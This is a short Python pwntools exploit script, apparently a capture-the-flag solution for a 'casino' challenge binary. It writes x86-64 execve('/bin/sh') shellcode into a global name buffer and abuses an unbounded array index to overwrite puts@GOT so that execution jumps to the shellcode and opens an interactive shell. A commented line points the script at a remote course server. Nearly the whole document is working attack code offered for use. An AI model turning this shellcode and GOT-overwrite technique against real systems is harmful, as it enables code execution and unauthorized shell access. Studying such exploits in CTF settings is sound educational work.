from pwn import *

# __read_chk@got    = 0x602018
# puts@got          = 0x602020
# printf@got        = 0x602030
# read@got          = 0x602038
# atoi@got          = 0x602058

# guess             = 0x6020d0
# name              = 0x6020f0
# seed              = 0x602100
# age               = 0x602104

puts = 0x602020
guess = 0x6020d0
idx = (puts - guess) / 4 + 1
number = int(0x6020f0 + 0x18)
random = [0x4d, 0x46, 0xd, 0x23, 0x46, 0x1c]

sh = process('./casino')
# sh = remote('edu-ctf.csie.org', 10172)

# Write sc to name, but it's cutted by input 'age', need to write sc letter
# This stage also has a job : Overwriting seed
# /bin/sh: 2f62696e2f7368
sc = asm('''
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
''', arch="amd64", os="linux")
payload = 'a'*0x10 + 'b'*0x4 + 'a'*0x4 + sc

sh.sendline(payload)
sleep(0.1)
sh.sendline(str(30))
sleep(0.1)

# Some useless input
for i in range(6):
    sh.sendline(str(7))
    sleep(0.1)

# Unbounded array allows us to overwrite puts@got
sh.sendline(str(1))
sleep(0.1)
sh.sendline(str(idx))
sleep(0.1)
sh.sendline(str(number))
sleep(0.1)

# Send correct answer
for i in range(6):
    sh.sendline(str(random[i]))
    sleep(0.1)

# Overwrite puts@got part2
sh.sendline(str(1))
sleep(0.1)
sh.sendline(str(idx+1))
sleep(0.1)
sh.sendline(str(0))
sleep(0.1)

# Then, it will execute puts@plt and jmp to our sc~

sh.interactive()



